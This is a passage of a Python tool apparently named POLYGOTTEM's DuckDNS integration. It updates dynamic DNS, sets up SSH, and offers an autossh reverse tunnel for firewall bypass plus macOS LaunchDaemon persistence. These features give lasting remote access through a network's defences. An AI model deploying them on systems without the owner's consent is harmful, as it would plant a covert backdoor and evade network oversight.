            print(f"⚠ Could not load configuration: {e}")
            return {}

    def setup_autossh_tunnel(self, remote_host: str, remote_port: int = 2222,
                            local_port: int = 22) -> bool:
        """
        Setup persistent SSH reverse tunnel using autossh

        Args:
            remote_host: Remote server to tunnel through
            remote_port: Remote port for reverse tunnel
            local_port: Local SSH port

        Returns:
            True if tunnel setup successful
        """
        try:
            # Check if autossh is installed
            result = subprocess.run(
                ['which', 'autossh'],
                capture_output=True,
                text=True
            )

            if result.returncode != 0:
                print("⚠ autossh not installed - install with: sudo apt install autossh")
                return False

            # Create autossh reverse tunnel
            tunnel_cmd = [
                'autossh',
                '-M', '0',
                '-f',
                '-N',
                '-R', f'{remote_port}:localhost:{local_port}',
                '-o', 'ServerAliveInterval=30',
                '-o', 'ServerAliveCountMax=3',
                remote_host
            ]

            subprocess.Popen(tunnel_cmd)
            print(f"✓ Reverse SSH tunnel established: {remote_host}:{remote_port} → localhost:{local_port}")
            return True

        except Exception as e:
            print(f"Error setting up autossh tunnel: {e}")
            return False

    def register_and_connect(self) -> bool:
        """
        Complete workflow: Update DuckDNS, start SSH, show connection info

        Returns:
            True if all steps successful
        """
        print("\n" + "="*70)
        print("DuckDNS Registration & SSH Setup")
        print("="*70 + "\n")

        # Step 1: Update DuckDNS
        print("[1/4] Updating DuckDNS...")
        if not self.update_duckdns():
            print("⚠ DuckDNS update failed, continuing anyway...")

        print()

        # Step 2: Setup SSH
        print("[2/4] Setting up SSH server...")
        ssh_success = self.setup_ssh_server()

        print()

        # Step 3: Verify configuration
        print("[3/4] Verifying configuration...")
        port_verified = self._verify_ssh_port(self.ssh_port)
        if port_verified:
            print(f"✓ SSH port {self.ssh_port} is accessible")
        else:
            print(f"⚠ SSH port {self.ssh_port} verification failed")
            if self.ssh_port != 22:
                print(f"  Custom port may need firewall configuration")

        print()

        # Step 4: Show connection info
        print("[4/4] SSH Connection Information:")
        print("-" * 70)

        info = self.get_ssh_connection_info()
        if info:
            print(f"  Domain:     {info['domain']}")
            print(f"  Public IP:  {info['ip']}")
            print(f"  Username:   {info['username']}")
            print(f"  Port:       {info['port']}")
            print()
            print(f"  Connection: {info['connection_string']}")
            print(f"  Updated:    {info['timestamp']}")

        print("-" * 70)
        print()

        # Save configuration
        if self.save_configuration():
            print(f"✓ Configuration saved to {self.config_file}")
        print()

        print("✓ Setup complete!")
        print()
        print("To connect remotely:")
        print(f"  {info.get('connection_string', 'ssh <user>@' + self.full_domain)}")
        print()

        # Port-specific firewall instructions
        print("⚠ FIREWALL CONFIGURATION REQUIRED:")
        print(f"  Port {self.ssh_port} must be accessible from the internet")
        print()

        if self.ssh_port == 22:
            print("  Ubuntu/Debian:")
            print("    sudo ufw allow 22/tcp")
            print()
            print("  Fedora/RHEL:")
            print("    sudo firewall-cmd --add-service=ssh --permanent")
            print("    sudo firewall-cmd --reload")
        else:
            print(f"  Ubuntu/Debian:")
            print(f"    sudo ufw allow {self.ssh_port}/tcp")
            print()
            print(f"  Fedora/RHEL:")
            print(f"    sudo firewall-cmd --add-port={self.ssh_port}/tcp --permanent")
            print(f"    sudo firewall-cmd --reload")

        print()

        # Router/NAT port forwarding
        print("  If behind NAT/router, configure port forwarding:")
        print(f"    External port {self.ssh_port} → Internal IP:{self.ssh_port}")
        print()

        return True


def main():
    """CLI interface for DuckDNS integration with multi-service fallback"""
    import argparse

    parser = argparse.ArgumentParser(
        description="DuckDNS Integration for POLYGOTTEM (with DynDNS, No-IP, Namecheap fallbacks)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Update DuckDNS only
  python3 duckdns_integration.py --update

  # Full setup (DuckDNS + SSH)
  python3 duckdns_integration.py --full

  # Update with DynDNS fallback
  python3 duckdns_integration.py --update \\
    --dyndns-domain example.dyndns.org \\
    --dyndns-user username \\
    --dyndns-pass password

  # Update with multiple fallbacks (DynDNS + No-IP)
  python3 duckdns_integration.py --update \\
    --dyndns-domain example.dyndns.org \\
    --dyndns-user username \\
    --dyndns-pass password \\
    --noip-domain example.no-ip.org \\
    --noip-user username \\
    --noip-pass password

  # Update with all 3 fallback services (DynDNS + No-IP + Namecheap)
  python3 duckdns_integration.py --update \\
    --dyndns-domain example.dyndns.org \\
    --dyndns-user username \\
    --dyndns-pass password \\
    --noip-domain example.no-ip.org \\
    --noip-user username \\
    --noip-pass password \\
    --namecheap-domain example.com \\
    --namecheap-user namecheap-user \\
    --namecheap-pass namecheap-pass

  # macOS: Install persistence (LaunchDaemons + LaunchAgents)
  python3 duckdns_integration.py --install-macos-persistence

  # macOS: Install with reverse tunnel
  python3 duckdns_integration.py --install-macos-persistence --tunnel-host example.com

  # Setup reverse tunnel only
  python3 duckdns_integration.py --reverse-tunnel example.com --tunnel-port 2222
        """
    )
    parser.add_argument(
        '--update',
        action='store_true',
        help='Update DuckDNS with current IP'
    )
    parser.add_argument(
        '--setup-ssh',
        action='store_true',
        help='Setup SSH server'
    )
    parser.add_argument(
        '--full',
        action='store_true',
        help='Complete setup (update + SSH)'
    )
    parser.add_argument(
        '--ip',
        type=str,
        help='Manually specify IP address'
    )
    parser.add_argument(
        '--port',
        type=int,
        default=None,
        help='SSH port (default: random non-standard port for security, or specify custom)'
    )
    parser.add_argument(
        '--install-macos-persistence',
        action='store_true',
        help='macOS: Install LaunchDaemons and LaunchAgents for persistence'
    )
    parser.add_argument(
        '--tunnel-host',
        type=str,
        help='Remote host for reverse SSH tunnel (for NAT/firewall bypass)'
    )
    parser.add_argument(
        '--tunnel-port',
        type=int,
        default=2222,
        help='Remote port for reverse tunnel (default: 2222)'
    )
    parser.add_argument(
        '--tunnel-user',
        type=str,
        default='tunnel',
        help='Remote username for reverse tunnel (default: tunnel)'
    )
    parser.add_argument(
        '--reverse-tunnel',
        type=str,
        metavar='HOST',
        help='Setup reverse SSH tunnel to specified host (shortcut for --tunnel-host)'
    )
    parser.add_argument(
        '--dyndns-domain',
        type=str,
        help='DynDNS domain for fallback (e.g., example.dyndns.org)'
    )
    parser.add_argument(
        '--dyndns-user',
        type=str,
        help='DynDNS username for fallback'
    )
    parser.add_argument(
        '--dyndns-pass',
        type=str,
        help='DynDNS password for fallback'
    )
    parser.add_argument(
        '--noip-domain',
        type=str,
        help='No-IP domain for fallback (e.g., example.no-ip.org)'
    )
    parser.add_argument(
        '--noip-user',
        type=str,
        help='No-IP username for fallback'
    )
    parser.add_argument(
        '--noip-pass',
        type=str,
        help='No-IP password for fallback'
    )
    parser.add_argument(
        '--namecheap-domain',
        type=str,
        help='Namecheap domain for fallback (e.g., example.com)'
    )
    parser.add_argument(
        '--namecheap-user',
        type=str,
        help='Namecheap username for fallback'
    )
    parser.add_argument(
        '--namecheap-pass',
        type=str,
        help='Namecheap password for fallback'
    )

    args = parser.parse_args()

    # Initialize integration with port and DNS fallbacks
    duckdns = DuckDNSIntegration(
        ssh_port=args.port,
        dyndns_domain=args.dyndns_domain,
        dyndns_user=args.dyndns_user,
        dyndns_pass=args.dyndns_pass,
        noip_domain=args.noip_domain,
        noip_user=args.noip_user,
        noip_pass=args.noip_pass,
        namecheap_domain=args.namecheap_domain,
        namecheap_user=args.namecheap_user,
        namecheap_pass=args.namecheap_pass
    )

    # Show selected port for user awareness
    if args.port is None and (args.full or args.setup_ssh or args.install_macos_persistence):
        print(f"\n🔒 SECURITY: Using randomized SSH port {duckdns.ssh_port}")
        print(f"   (Use --port to specify custom port)\n")

    # Show DNS fallback status
    if duckdns.dyndns_enabled or duckdns.noip_enabled or duckdns.namecheap_enabled:
        print(f"\n[*] DNS Fallback Services Enabled:")
        if duckdns.dyndns_enabled:
            print(f"    • DynDNS: {duckdns.dyndns_domain}")
        if duckdns.noip_enabled:
            print(f"    • No-IP: {duckdns.noip_domain}")
        if duckdns.namecheap_enabled:
            print(f"    • Namecheap: {duckdns.namecheap_domain}")
        print()

    # Handle macOS persistence installation
    if args.install_macos_persistence:
        if not is_macos():
            print("✗ --install-macos-persistence requires macOS")
            sys.exit(1)

        remote_host = args.tunnel_host or args.reverse_tunnel
        duckdns.install_macos_persistence(remote_host=remote_host)

    # Handle reverse tunnel setup
    elif args.reverse_tunnel or args.tunnel_host:
        remote_host = args.reverse_tunnel or args.tunnel_host
        print(f"\n[*] Setting up reverse SSH tunnel to {remote_host}...")

        if duckdns.setup_autossh_tunnel(
            remote_host=remote_host,
            remote_port=args.tunnel_port,
            local_port=duckdns.ssh_port
        ):
            print("\n✓ Reverse tunnel setup complete!")
            print(f"  Connect via: ssh -p {args.tunnel_port} {os.getenv('USER')}@{remote_host}")
        else:
            print("\n✗ Reverse tunnel setup failed")

    # Handle standard operations
    elif args.update:
        duckdns.update_duckdns(args.ip)
    elif args.setup_ssh:
        duckdns.setup_ssh_server()
    elif args.full:
        duckdns.register_and_connect()
    else:
        # Default: show current info or load from config
        config = duckdns.load_configuration()
        if config:
            print("\nSaved Configuration:")
            print("="*70)
            for key, value in config.items():
                print(f"  {key:20}: {value}")
            print("="*70)
        else:
            print("\nCurrent SSH Connection Info:")
            print("="*70)
            info = duckdns.get_ssh_connection_info()
            for key, value in info.items():
                print(f"  {key:20}: {value}")
            print("="*70)
        print("\nUse --help for more options")


if __name__ == '__main__':
    main()
